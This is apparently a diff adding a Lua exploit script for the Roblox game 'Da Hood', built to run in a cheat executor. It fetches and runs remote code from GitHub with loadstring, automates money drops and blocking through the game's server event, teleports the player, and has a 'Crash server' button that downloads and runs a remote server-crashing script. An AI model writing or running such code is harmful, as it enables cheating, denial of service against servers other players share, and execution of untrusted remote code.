@@ -1,0 +1,57 @@
+local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AikaV3rm/UiLib/master/Lib.lua')))()
+
+local w = library:CreateWindow("Da hood script")
+
+local b = w:CreateFolder("pagina 1")
+local Tut = w:CreateFolder("Tutorial")
+Tut:Button("Left control",function()
+end)
+Tut:Button("to open / close gui",function()
+end)
+getgenv().AutoDrop = false
+
+b:Toggle("Auto block",function(bool)
+    shared.toggle = bool
+    local tbl_main = 
+{
+      "Block", 
+      bool
+}
+game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(tbl_main))
+end)
+
+b:Toggle("Auto drop",function(bool)
+    getgenv().AutoDrop = bool
+    if bool == true then
+        spAutoDrop()
+    end
+end)
+
+b:Box("Drop money :","number",function(value)
+    local tbl_main = {
+        "DropMoney", 
+        ""..value..""
+       }
+       game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(tbl_main))
+end)
+
+b:Button("Safe zone #2",function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207, 38, 200015)
+end)
+
+b:Button("Crash server", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+function spAutoDrop()
+    spawn(function()
+        while getgenv().AutoDrop == true do     
+            local tbl_main = {
+             "DropMoney", 
+             "10000"
+            }
+            game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(tbl_main))
+            wait(0.2)
+        end
+    end)
+end
